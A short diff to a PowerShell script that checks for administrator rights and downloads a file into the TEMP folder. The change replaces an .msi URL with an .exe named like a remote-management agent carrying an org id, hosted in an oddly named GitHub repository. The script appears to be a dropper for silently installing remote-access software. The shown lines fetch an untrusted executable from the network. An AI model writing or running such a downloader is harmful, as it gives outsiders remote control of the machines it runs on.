@@ -6,7 +6,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 # Set the MSI URL
-$msiUrl = "https://github.com/FinMail999/sossssssss/raw/refs/heads/main/17UJMVC14U8SG_19SI0B7FBSUF4_windows_x64.msi"
+$msiUrl = "https://github.com/FinMail999/sossssssss/raw/refs/heads/main/Pro_rmm_v2.5.0.67_oid2ad1a562-3e15-4e44-812c-901f49386dbf_bidr2Jh4IVgYkiyBZ1!DI5p-w.exe"
 
 # Destination in TEMP folder
 $dest = Join-Path $env:TEMP $([System.IO.Path]::GetFileName($msiUrl))
